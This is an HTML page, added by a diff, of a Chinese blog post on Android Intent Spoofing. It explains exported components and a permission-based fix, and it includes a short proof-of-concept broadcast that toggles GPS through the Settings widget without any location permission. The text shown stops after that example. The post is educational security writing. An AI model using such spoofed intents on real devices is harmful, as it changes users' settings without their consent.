@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"usmacd.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0. Android的安全模型 application sandbox selinux permissions application signing  正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的意图是什么，Android系统将调用相应的处理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intent Spoofing 攻击">
+<meta property="og:url" content="http://usmacd.com/2020/03/19/android_intent_base_attack/index.html">
+<meta property="og:site_name" content="安全代码">
+<meta property="og:description" content="0. Android的安全模型 application sandbox selinux permissions application signing  正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的意图是什么，Android系统将调用相应的处理">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-19T08:34:31.917Z">
+<meta property="article:modified_time" content="2020-03-19T08:34:31.917Z">
+<meta property="article:author" content="henices">
+<meta property="article:tag" content="Security">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://usmacd.com/2020/03/19/android_intent_base_attack/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://usmacd.com/2020/03/19/android_intent_base_attack/","path":"2020/03/19/android_intent_base_attack/","title":"Intent Spoofing 攻击"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Intent Spoofing 攻击 | 安全代码</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">安全代码</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-Android%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">0. Android的安全模型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Intent"><span class="nav-number">2.</span> <span class="nav-text">1. Intent</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Intent-Spoofing"><span class="nav-number">3.</span> <span class="nav-text">2. Intent Spoofing</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E4%B8%80%E8%88%AC%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 一般解决方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E7%94%A8%E6%89%8B%E6%9C%BAGPS"><span class="nav-number">3.2.1.</span> <span class="nav-text">启用手机GPS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B1%9F%E8%8B%8F%E9%93%B6%E8%A1%8C%E6%89%8B%E6%9C%BA%E9%93%B6%E8%A1%8C%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E4%BB%BB%E6%84%8Fapk%EF%BC%88%E5%8F%AF%E6%9C%A8%E9%A9%AC%EF%BC%89"><span class="nav-number">3.2.2.</span> <span class="nav-text">江苏银行手机银行下载安装任意apk（可木马）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BE%8E%E5%9B%A2%E5%A4%96%E5%8D%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9C%AC%E5%9C%B0%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.2.3.</span> <span class="nav-text">美团外卖客户端本地拒绝服务漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%88%AA%E6%97%85%E7%BA%B5%E6%A8%AA%E6%89%8B%E5%8A%BF%E9%94%81%E8%BD%BB%E6%98%93%E7%BB%95%E8%BF%87%E5%8F%8A%E5%85%B6%E5%AE%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.2.4.</span> <span class="nav-text">航旅纵横手势锁轻易绕过及其它漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="henices"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">henices</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">97</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/henices" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="http://scz.617.cn:8/" title="http:&#x2F;&#x2F;scz.617.cn:8&#x2F;" rel="noopener" target="_blank">飞花堂</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com&#x2F;" rel="noopener" target="_blank">V2EX</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.forecho.com/" title="https:&#x2F;&#x2F;blog.forecho.com&#x2F;" rel="noopener" target="_blank">forecho</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://chensenlin.cn/" title="https:&#x2F;&#x2F;chensenlin.cn&#x2F;" rel="noopener" target="_blank">你好我是森林</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/android_intent_base_attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="henices">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Intent Spoofing 攻击 | 安全代码">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Intent Spoofing 攻击
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0-Android的安全模型"><a href="#0-Android的安全模型" class="headerlink" title="0. Android的安全模型"></a>0. Android的安全模型</h2><ul>
+<li>application sandbox</li>
+<li>selinux</li>
+<li>permissions</li>
+<li>application signing</li>
+</ul>
+<p>正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个<br>App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的<br>意图是什么，Android系统将调用相应的处理程序来处理。</p>
+<p>Intent 是一个将要执行的动作的抽象的描述，一般来说是作为参数来使用，由Intent来协<br>助完成android各个组件之间的通讯。比如说调用startActivity()来启动一个activity,或<br>者由broadcaseIntent()来传递给所有感兴趣的BroadcaseReceiver, 再或者由<br>startService()&#x2F;bindservice()来启动一个后台的service.所以可以看出来，intent主要<br>是用来启动其他的activity 或者service，所以可以将intent理解成activity之间的粘合剂。</p>
+<h2 id="1-Intent"><a href="#1-Intent" class="headerlink" title="1. Intent"></a>1. Intent</h2><p>Intent有两种类型，Explicit Intent 和 Implicit Intent。</p>
+<ul>
+<li>Explicit Intent</li>
+</ul>
+<p>明确指定Intent的名字(全类名)，当你使用Explicit Intent 启动Activity或者启动 Service，<br>Android系统会立即启动Intent对象所指定的Component。</p>
+<ul>
+<li>Implicit Intent</li>
+</ul>
+<p>指定Intent的ACTION，当你使用Implicit Intent，Android系统将通过比较 App Manifest<br>文件中所定义的Intent filter来启动符合要求的Component。如果只有一个Intentfilter<br>被匹配成功，系统将启动对应的Component，并递送Intent Object。如果有多个intent<br>filter是兼容的，系统将显示一个dialog，用户可以选择需要使用的component</p>
+<p>下面用代码说明这两种Intent</p>
+<p>Explicit Intent</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">downloadIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, DownloadService.class);</span><br><span class="line">downloadIntent.setData(Uri.parse(fileUrl));</span><br><span class="line">startService(downloadIntent);</span><br></pre></td></tr></table></figure>
+
+<p>Implicit Intent</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">sendIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">sendIntent.setAction(Intent.ACTION_SEND);</span><br><span class="line">sendIntent.putExtra(Intent.EXTRA_TEXT, textMessage);</span><br><span class="line">sendIntent.setType(HTTP.PLAIN_TEXT_TYPE); <span class="comment">// &quot;text/plain&quot; MIME type</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Verify that the intent will resolve to an activity</span></span><br><span class="line"><span class="keyword">if</span> (sendIntent.resolveActivity(getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    startActivity(sendIntent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="2-Intent-Spoofing"><a href="#2-Intent-Spoofing" class="headerlink" title="2. Intent Spoofing"></a>2. Intent Spoofing</h2><p>Android Intent Spoofing是一个比较常见的问题。如果Android组件(component,service<br>receiver)是导出的话(exported&#x3D;true)，恶意程序可以使用 Explicit Intent向这个组件<br>发送Intent，Android无法识别这个 Intent是谁发送的，将会正常的执行请求的操作。</p>
+<p>从上面的描述中可以发现，关键是 component要是导出的，而Android的component的导出的<br>默认值并不是固定的，这点我们从Google提供的文档可以证实。</p>
+<p><a target="_blank" rel="noopener" href="http://developer.android.com/guide/topics/manifest/receiver-element.html">http://developer.android.com/guide/topics/manifest/receiver-element.html</a></p>
+<p><strong>android:exported</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Whether or not the broadcast receiver can receive messages from sources outside</span><br><span class="line">its application — &quot;true&quot; if it can, and &quot;false&quot; if not. If &quot;false&quot;, the only messages </span><br><span class="line">the broadcast receiver can receive are those sent by components of the same </span><br><span class="line">application or applications with the same user ID.</span><br><span class="line"></span><br><span class="line">The default value depends on whether the broadcast receiver contains intent filters.</span><br><span class="line">The absence of any filters means that it can be invoked only by Intent objects </span><br><span class="line">that specify its exact class name. This implies that the receiver is intended </span><br><span class="line">only for application-internal use (since others would not normally know the class name). </span><br><span class="line">So in this case, the default value is &quot;false&quot;. On the other hand, the presence </span><br><span class="line">of at least one filter implies that the broadcast receiver is intended to receive </span><br><span class="line">intents broadcast by the system or other applications, so the default value is &quot;true&quot;.</span><br><span class="line"></span><br><span class="line">This attribute is not the only way to limit a broadcast receiver&#x27;s external exposure.</span><br><span class="line">You can also use a permission to limit the external entities that can send it </span><br><span class="line">messages (see the permission attribute).</span><br></pre></td></tr></table></figure>
+
+<p>我写了一个程序测试具体的情况。</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.PhoneReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.nsfocus.test&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试程序注册了一个Receiver，这个Receiver处理 com.nsfocus.test  <strong>Implicit Intent</strong><br>包含了一个Intent Filter，在AndroidManifest.xml中没有明确声明这个reciever是导出的<br>还是未导出的。</p>
+<p>receiver 的代码为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;Get it&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用adb shell中发送广播</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a com.nsfocus.test</span><br></pre></td></tr></table></figure>
+
+<p>可以看到Get it 的提示信息，也就是说 component 处理 Implicit Intent 时默认是<br><strong>exported&#x3D;true</strong> 的，这就是问题的关键。</p>
+<p>下面修改代码改成 <strong>exported&#x3D;false</strong>，看看是什么情况。</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.PhoneReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.nsfocus.test&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>receiver 照样可以收到，显示”Get it”，所以在receiver里做校验是非常有必要的。因为<br>无论exported如何设置，只要里面包含了Intent Filter 就可以接受到消息。</p>
+<h3 id="2-1-一般解决方案"><a href="#2-1-一般解决方案" class="headerlink" title="2.1 一般解决方案"></a>2.1 一般解决方案</h3><p>如果设置了 intent-filter，可以利用 android:permission 属性来要求广播发送者所<br>需要具有的必要权限，这样才不会产生权限绕过问题。</p>
+<p>比如我在.PhoneReceiver里要实现收短信的功能，就应该写成这样</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.PhoneReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:permission</span>=<span class="string">&quot;android.permission.SMS_RECEIVED&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.PHONE_STATE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样广播发送者需要声明** android.permission.SMS_RECEIVED **权限，不然.PhoneReceiver就不<br>处理了，修改后测试发现确实收不到了。</p>
+<h3 id="2-2-漏洞实例"><a href="#2-2-漏洞实例" class="headerlink" title="2.2 漏洞实例"></a>2.2 漏洞实例</h3><h4 id="启用手机GPS"><a href="#启用手机GPS" class="headerlink" title="启用手机GPS"></a>启用手机GPS</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.android.settings&quot;</span>, <span class="string">&quot;com.android.settings.widget.SettingsAppWidgetProvider&quot;</span>);</span><br><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.ALTERNATIVE&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;custom:3&quot;</span>));</span><br><span class="line">mContext.sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
+
+<p>上面这个例子是通过广播的方法进行攻击的，攻击的目标是com.android.settings.widget<br>Android并未提供操作GPS的API，但是通过上面这个方法却可以控制GPS的开关。而且更有趣<br>的是我们并没有声明任何和Location相关的权限 :)</p>
+<p>widget是Android提供的桌面的小插件，就和KDE的之类的插件类似，可以通过Google提供的<br>API来开发。</p>
+<p>custom:3 这个字符串比较诡异，其实可以在Android 的代码中找到</p>
+<p>&#x2F;com&#x2F;android&#x2F;settings&#x2F;widget&#x2F;SettingsAppWidgetProvider.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BUTTON_WIFI</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BUTTON_BRIGHTNESS</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BUTTON_SYNC</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BUTTON_LOCATION</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BUTTON_BLUETOOTH</span> <span class="operator">=</span> <span class="number">4</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onReceive(context, intent);</span><br><span class="line">    <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">    <span class="keyword">if</span> (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action)) &#123;</span><br><span class="line">        sWifiState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BluetoothAdapter.ACTION_STATE_CHANGED.equals(action)) &#123;</span><br><span class="line">        sBluetoothState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (LocationManager.MODE_CHANGED_ACTION.equals(action)) &#123;</span><br><span class="line">        sLocationState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ContentResolver.ACTION_SYNC_CONN_STATUS_CHANGED.equals(action)) &#123;</span><br><span class="line">        sSyncState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (intent.hasCategory(Intent.CATEGORY_ALTERNATIVE)) &#123;</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> intent.getData();</span><br><span class="line">        <span class="type">int</span> <span class="variable">buttonId</span> <span class="operator">=</span> Integer.parseInt(data.getSchemeSpecificPart());</span><br><span class="line">        <span class="keyword">if</span> (buttonId == BUTTON_WIFI) &#123;</span><br><span class="line">            sWifiState.toggleState(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_BRIGHTNESS) &#123;</span><br><span class="line">            toggleBrightness(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_SYNC) &#123;</span><br><span class="line">            sSyncState.toggleState(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_LOCATION) &#123;</span><br><span class="line">            sLocationState.toggleState(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_BLUETOOTH) &#123;</span><br><span class="line">            sBluetoothState.toggleState(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t fall-through to updating the widget.  The Intent</span></span><br><span class="line">        <span class="comment">// was something unrelated or that our super class took</span></span><br><span class="line">        <span class="comment">// care of.</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// State changes fall through</span></span><br><span class="line">    updateWidget(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现无法对广播的发送者进行校验，收到广播就执行相关的动作。</p>
